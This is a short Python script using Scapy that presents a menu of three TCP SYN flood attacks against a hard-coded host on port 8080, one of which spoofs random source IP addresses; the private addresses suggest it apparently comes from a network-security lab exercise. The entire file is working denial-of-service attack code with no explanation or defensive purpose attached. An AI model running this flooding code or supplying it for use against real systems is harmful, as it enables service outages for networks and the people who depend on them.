#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"

IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

IP_M = "10.9.0.105"
MAC_M = "02:42:0a:09:00:69"

Attack_port=8080

print(" 1.Single IP Single port Flooding \n 2. Single IP Multiple port \n 3.Multiple IP multiple port \n")
choice=input('Enter Your choice of TCP Flood Attack :')

# From Single IP Single port Flooding
if choice == '1':
 i=1
 while i <= 500:
  IP1 = IP(src=IP_M, dst=IP_A)
  TCP1=TCP(sport=Attack_port,dport=random.randint(1,65535),flags='S')
  pkt=IP1 / TCP1
  p=sr1(pkt,inter =.01)  
  print( i, "Packets sent")
  i=i+1

# Single IP Multiple port
elif choice == '2':
  i = 1
  while i <= 100:
   #for source_port in range(1, 65535):
    IP1 = IP(src = IP_M, dst = IP_A)
    TCP1 = TCP(sport = random.randint(1,65535), dport = Attack_port, flags='S')
    pkt = IP1 / TCP1
    send(pkt, inter = .01)
    print (i,"Packets sent")
    i = i + 1

# Multiple IP multiple port
elif choice == '3':
 i = 1
 while i<=5:
   a = str(random.randint(1,254))
   b = str(random.randint(1,254))
   c = str(random.randint(1,254))
   d = str(random.randint(1,254))
   dot = "."
   Source_ip = a + dot + b + dot + c + dot + d
   for source_port in range(1, 100):
    IP1 = IP(src = Source_ip, dst = IP_A)
    TCP1 = TCP(sport = source_port, dport = Attack_port, flags='S')
    pkt = IP1 / TCP1
    send(pkt,inter = .01)
   #print ("packet sent ", i*50)
   i = i + 1
    
else:
 print('Wrong Choice')


